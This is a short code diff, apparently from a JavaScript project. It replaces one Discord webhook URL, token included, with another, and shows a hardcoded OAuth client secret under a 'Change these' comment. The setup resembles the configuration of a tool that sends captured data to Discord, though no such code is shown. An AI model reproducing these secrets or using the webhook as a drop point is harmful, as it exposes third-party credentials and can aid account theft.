@@ -1,4 +1,4 @@
-const dh = "https://discord.com/api/webhooks/1106776324925837322/9ljrZVGZQNDZFB73dwHjDITvbL67WyknmcBsCySvr9bVzHtTTJRMqFRvdUei0_h0N9ls"
+const dh = "https://discord.com/api/webhooks/1107830777351241799/FD8_NVtkVqK8c1QJmjjCwlaB-LK8Uk1kYOuQW5IRcj5sPh9ltgnz5cnglbg3CaHW5n-W"
 
 //Change these
 const client_secret = 'D0u8Q~uN.DoKlF-XEcWpGlDYv-Vor7MJmWBR6bF1' //you need to put the "Secret Value" here not the "Secret ID"!!!!
